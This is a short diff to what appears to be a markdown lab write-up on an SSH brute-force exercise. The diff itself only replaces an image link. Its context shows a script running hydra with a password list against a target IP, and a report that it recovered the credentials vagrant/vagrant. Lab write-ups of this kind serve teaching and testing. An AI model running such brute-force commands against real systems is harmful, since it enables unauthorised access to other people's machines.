@@ -16,7 +16,7 @@ PASSWORD_LIST="passwords.txt"
 echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
 hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
 ```
-![Script created](./screenshots/08_script_created.png)
+<img src="./screenshots/08_script_created.png" alt="User/Pass file created" width="600"/>
 
 ## Execution Steps
 The script executed successfully. Hydra found the correct SSH login credentials: vagrant / vagrant. The attack stopped after identifying the valid password.
